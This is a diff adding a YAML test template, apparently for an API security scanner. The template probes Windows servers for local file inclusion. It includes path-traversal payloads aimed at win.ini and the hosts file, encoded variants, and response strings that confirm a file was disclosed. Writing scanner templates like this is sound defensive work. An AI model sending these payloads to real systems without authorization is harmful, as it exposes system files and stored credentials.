@@ -1,0 +1,99 @@
+id: LFI_WINDOWS_PATH_TRAVERSAL
+info:
+  name: "Local File Inclusion via Windows Path Traversal"
+  description: "Tests for Local File Inclusion on Windows servers using backslash path traversal and Windows-specific sensitive file targets."
+  details: >
+    "Windows servers may be vulnerable to path traversal using backslash sequences
+    (..\\..\\) or mixed separators. Windows-specific sensitive files such as
+    win.ini, system.ini, boot.ini, and SAM database are common targets. This test
+    specifically targets APIs running on Windows-based infrastructure."
+  impact: "Disclosure of Windows system configuration files, IIS web server configuration,
+    application credentials stored in web.config, and in some cases the SAM database
+    containing password hashes, enabling offline password cracking."
+  category:
+    name: LFI
+    shortName: LFI
+    displayName: Local File Inclusion
+  subCategory: LFI_WINDOWS_PATH_TRAVERSAL
+  severity: HIGH
+  tags:
+    - OWASP top 10
+    - Business logic
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
+    - "https://cwe.mitre.org/data/definitions/22.html"
+  cwe:
+    - CWE-22
+    - CWE-73
+  cve:
+    - CVE-2022-29464
+
+attributes:
+  nature: INTRUSIVE
+  plan: FREE
+  duration: FAST
+
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  method:
+    neq: "OPTIONS"
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+
+execute:
+  type: single
+  requests:
+    - req:
+        - add_query_param:
+            file: "..\\..\\..\\windows\\win.ini"
+        - add_query_param:
+            file: "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+        - add_query_param:
+            path: "..\\..\\..\\windows\\win.ini"
+        - add_query_param:
+            file: "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini"
+        - add_query_param:
+            file: "....\\\\....\\\\....\\\\windows\\\\win.ini"
+
+validate:
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    contains_either:
+      - "[extensions]"
+      - "[fonts]"
+      - "[mci extensions"
+      - "for 16-bit app support"
+      - "127.0.0.1"
+      - "localhost"
